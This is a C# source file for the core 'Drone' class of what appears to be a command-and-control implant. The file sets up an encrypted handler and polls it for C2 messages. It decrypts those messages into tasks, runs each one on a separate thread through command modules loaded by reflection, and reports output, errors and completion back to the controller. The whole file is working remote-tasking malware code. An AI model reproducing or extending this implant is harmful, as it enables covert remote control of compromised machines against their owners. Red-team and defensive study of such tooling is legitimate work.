using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;

using Drone.Interfaces;
using Drone.Models;
using Drone.Services;
using Drone.Utilities;

namespace Drone;

public class Drone
{
    public IConfig Config { get; private set; }
    
    private Metadata _metadata;
    private ICrypto _crypto;
    private IHandler _handler;

    private readonly List<DroneFunction> _commands = new();
    private readonly Dictionary<string, Thread> _threads = new();
    
    private bool _running;
    
    public void Start()
    {
        Config = Helpers.GetDefaultConfig;
        _metadata = Helpers.GetMetadata;
        _crypto = new Crypto();
        
        LoadCommands();
        
        _handler = Helpers.GetHandler;
        _handler.Init(_metadata, Config, _crypto);
        
        // don't await
        _handler.Start().ConfigureAwait(false);
        
        _running = true;
        Run();
    }

    private void Run()
    {
        while (_running)
        {
            if (_handler.GetInbound(out var messages))
            {
                HandleC2Messages(messages);
            }
            
            Thread.Sleep(100);
        }
    }

    private void HandleC2Messages(IEnumerable<C2Message> messages)
    {
        foreach (var message in messages)
            HandleC2Message(message);
    }

    private void HandleC2Message(C2Message message)
    {
        // decrypt message
        IEnumerable<DroneTask> tasks;
        
        try
        {
            tasks = _crypto.DecryptObject<IEnumerable<DroneTask>>(message.Iv, message.Data, message.Checksum);
        }
        catch (CryptoException e)
        {
            SendError("", e.Message);
            return;
        }

        HandleC2Tasks(tasks);
    }

    private void HandleC2Tasks(IEnumerable<DroneTask> tasks)
    {
        foreach (var task in tasks)
        {
            var thread = new Thread(HandleC2Task);
            _threads.Add(task.TaskId, thread);
            thread.Start(task);
        }
    }

    private void HandleC2Task(object obj)
    {
        if (obj is not DroneTask task)
            return;
        
        var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Function));
        
        if (command is null)
        {
            SendError(task.TaskId, $"Unknown command \"{task.Function}\"");
            return;
        }

        try
        {
            // blocks
            command.Execute(task);
        }
        catch (ThreadAbortException)
        {
            SendTaskComplete(task.TaskId);
        }
        catch (Exception e)
        {
            SendError(task.TaskId, e.Message);
        }

        if (_threads.ContainsKey(task.TaskId))
            _threads.Remove(task.TaskId);
    }

    public void SendError(string id, string error)
    {
        var response = new DroneTaskOutput
        {
            TaskId = id,
            Status = DroneTaskOutput.TaskStatus.Aborted,
            Output = Encoding.UTF8.GetBytes(error)
        };
        
        SendTaskResponse(response);
    }

    public void SendOutput(string id, string output, bool stillRunning = false)
    {
        var response = new DroneTaskOutput
        {
            TaskId = id,
            Status = stillRunning ? DroneTaskOutput.TaskStatus.Running : DroneTaskOutput.TaskStatus.Complete,
            Output = Encoding.UTF8.GetBytes(output)
        };

        SendTaskResponse(response);
    }

    public void SendTaskComplete(string id)
    {
        var response = new DroneTaskOutput
        {
            TaskId = id,
            Status = DroneTaskOutput.TaskStatus.Complete
        };
        
        SendTaskResponse(response);
    }

    public void SendTaskResponse(DroneTaskOutput output)
    {
        _handler.QueueOutbound(output);
    }

    public bool CancelTask(string taskId)
    {
        if (!_threads.TryGetValue(taskId, out var thread))
            return false;
        
        _threads.Remove(taskId);
        
        thread.Abort();
        return true;
    }

    public void Stop()
    {
        _running = false;
    }

    private void LoadCommands()
    {
        var self = Assembly.GetExecutingAssembly();

        foreach (var type in self.GetTypes())
        {
            if (!type.IsSubclassOf(typeof(DroneFunction)))
                continue;

            var command = (DroneFunction) Activator.CreateInstance(type);
            command.Init(this);
            
            _commands.Add(command);
        }
    }
}